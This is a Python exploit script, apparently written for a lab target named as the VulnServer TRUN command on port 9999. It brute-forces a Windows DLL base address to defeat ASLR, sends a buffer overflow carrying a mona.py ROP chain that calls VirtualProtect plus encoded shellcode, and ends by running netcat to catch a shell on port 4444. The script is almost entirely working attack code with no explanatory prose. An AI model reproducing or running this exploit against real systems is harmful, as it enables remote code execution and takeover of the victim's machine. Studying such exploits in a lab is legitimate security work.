#!/usr/bin/env python3


'''

Bypassing ASLR by guessing the base address of RPCRT4.dll


'''

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.
import time     # The module "time" provides access to runtime and sleep tracking
from socket import error as SocketError # Socket error
import errno    # Error no (Syscall error)
import os       # OS Execute Telnet


# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

# Searching space of RPCRT4.dll base address: 0x7500 0000 - 0x7800 0000
# Lower and upper bounds of the search space (only higher two bytes)
lower_bound = 0x771A
upper_bound = 0x7800

def create_rop_chain(base):
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        base + 0x1F6A4E,  # POP EAX # RETN [combase.dll] ** REBASED ** ASLR 
        base + 0x24936C,  # ptr to &VirtualProtect() [IAT combase.dll] ** REBASED ** ASLR
        base + 0x1329D1,  # MOV EAX,DWORD PTR DS:[EAX] # ADD CL,CL # RETN [combase.dll] ** REBASED ** ASLR 
        base + 0x161A66,  # XCHG EAX,ESI # RETN [combase.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebp:---]
        base + 0xA635C,  # POP EBP # RETN [combase.dll] ** REBASED ** ASLR 
        base + 0x13D37,  # & jmp esp [combase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebx:---]
        base + 0x101176,  # POP EAX # RETN [combase.dll] ** REBASED ** ASLR 
        0xfffffdff,  # Value to negate, will become 0x00000201
        base + 0x14AEDD,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
        base + 0x1063F9,  # POP EBX # RETN [combase.dll] ** REBASED ** ASLR 
        0xffffffff,  #  
        base + 0xFEDCF,  # INC EBX # ADD AL,3B # RETN [combase.dll] ** REBASED ** ASLR 
        base + 0xE3693,  # ADD EBX,EAX # ADD EAX,4 # RETN [combase.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_edx:---]
        base + 0x116F8F,  # POP EAX # RETN [combase.dll] ** REBASED ** ASLR 
        0xffffffc0,  # Value to negate, will become 0x00000040
        base + 0xC86FD,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
        base + 0xA7F0A,  # XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        base + 0x6327A,  # POP ECX # RETN [combase.dll] ** REBASED ** ASLR 
        base + 0x24691B,  # &Writable location [combase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        base + 0x1D641E,  # POP EDI # RETN [combase.dll] ** REBASED ** ASLR 
        base + 0xF9615,  # RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        base + 0x135142,  # POP EAX # RETN [combase.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        base + 0x7CEC,  # PUSHAD # RETN [combase.dll] ** REBASED ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)


SHELL =  b""
SHELL += b"\xd9\xcb\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x53\xbe"
SHELL += b"\x04\x9a\xb8\x9a\x31\x72\x17\x03\x72\x17\x83\xee"
SHELL += b"\x66\x5a\x6f\x12\x7e\x19\x90\xea\x7f\x7e\x18\x0f"
SHELL += b"\x4e\xbe\x7e\x44\xe1\x0e\xf4\x08\x0e\xe4\x58\xb8"
SHELL += b"\x85\x88\x74\xcf\x2e\x26\xa3\xfe\xaf\x1b\x97\x61"
SHELL += b"\x2c\x66\xc4\x41\x0d\xa9\x19\x80\x4a\xd4\xd0\xd0"
SHELL += b"\x03\x92\x47\xc4\x20\xee\x5b\x6f\x7a\xfe\xdb\x8c"
SHELL += b"\xcb\x01\xcd\x03\x47\x58\xcd\xa2\x84\xd0\x44\xbc"
SHELL += b"\xc9\xdd\x1f\x37\x39\xa9\xa1\x91\x73\x52\x0d\xdc"
SHELL += b"\xbb\xa1\x4f\x19\x7b\x5a\x3a\x53\x7f\xe7\x3d\xa0"
SHELL += b"\xfd\x33\xcb\x32\xa5\xb0\x6b\x9e\x57\x14\xed\x55"
SHELL += b"\x5b\xd1\x79\x31\x78\xe4\xae\x4a\x84\x6d\x51\x9c"
SHELL += b"\x0c\x35\x76\x38\x54\xed\x17\x19\x30\x40\x27\x79"
SHELL += b"\x9b\x3d\x8d\xf2\x36\x29\xbc\x59\x5f\x9e\x8d\x61"
SHELL += b"\x9f\x88\x86\x12\xad\x17\x3d\xbc\x9d\xd0\x9b\x3b"
SHELL += b"\xe1\xca\x5c\xd3\x1c\xf5\x9c\xfa\xda\xa1\xcc\x94"
SHELL += b"\xcb\xc9\x86\x64\xf3\x1f\x32\x6c\x52\xf0\x21\x91"
SHELL += b"\x24\xa0\xe5\x39\xcd\xaa\xe9\x66\xed\xd4\x23\x0f"
SHELL += b"\x86\x28\xcc\x3e\x0b\xa4\x2a\x2a\xa3\xe0\xe5\xc2"
SHELL += b"\x01\xd7\x3d\x75\x79\x3d\x16\x11\x32\x57\xa1\x1e"
SHELL += b"\xc3\x7d\x85\x88\x48\x92\x11\xa9\x4e\xbf\x31\xbe"
SHELL += b"\xd9\x35\xd0\x8d\x78\x49\xf9\x65\x18\xd8\x66\x75"
SHELL += b"\x57\xc1\x30\x22\x30\x37\x49\xa6\xac\x6e\xe3\xd4"
SHELL += b"\x2c\xf6\xcc\x5c\xeb\xcb\xd3\x5d\x7e\x77\xf0\x4d"
SHELL += b"\x46\x78\xbc\x39\x16\x2f\x6a\x97\xd0\x99\xdc\x41"
SHELL += b"\x8b\x76\xb7\x05\x4a\xb5\x08\x53\x53\x90\xfe\xbb"
SHELL += b"\xe2\x4d\x47\xc4\xcb\x19\x4f\xbd\x31\xba\xb0\x14"
SHELL += b"\xf2\xda\x52\xbc\x0f\x73\xcb\x55\xb2\x1e\xec\x80"
SHELL += b"\xf1\x26\x6f\x20\x8a\xdc\x6f\x41\x8f\x99\x37\xba"
SHELL += b"\xfd\xb2\xdd\xbc\x52\xb2\xf7"

higher_bytes = lower_bound  # Initialize the higher two bytes of the base address of RPCRT4.dll

start_time = time.time()

while higher_bytes <= upper_bound:
    base = higher_bytes << 16
    print('base: ', hex(base))

    higher_bytes += 1

    PAYLOAD = (
        b'TRUN /.:/' +
        b'A' * 1995 +
        # 0x6250129D Address of RETN
        struct.pack('<L', base + 0x10E9) +
    	create_rop_chain(base) +
    	# Align stack
    	b'\x83\xE4\xF0' +   # and esp, 0xfffffff0
    	SHELL +
    	b'C' * 990
    )

    with socket.create_connection((HOST, PORT)) as fd:
        fd.sendall(PAYLOAD)
        time.sleep(5) # Can be adjusted. If the delay is too long, it is not efficient; If the delay is too short, the hit might be a false positive.
        try:
            fd.sendall(b'HELP')
            print('HELP')
        except SocketError as e:
            # Program crashes, continue the loop
            if e.errno == errno.ECONNRESET:
                print('Continue')
        else:
            # Program does not crash, attack succeeds
            print('Hit')
            break

print('Execution time: ', time.time()-start_time)
time.sleep(2)
os.system("nc 10.0.2.15 4444")
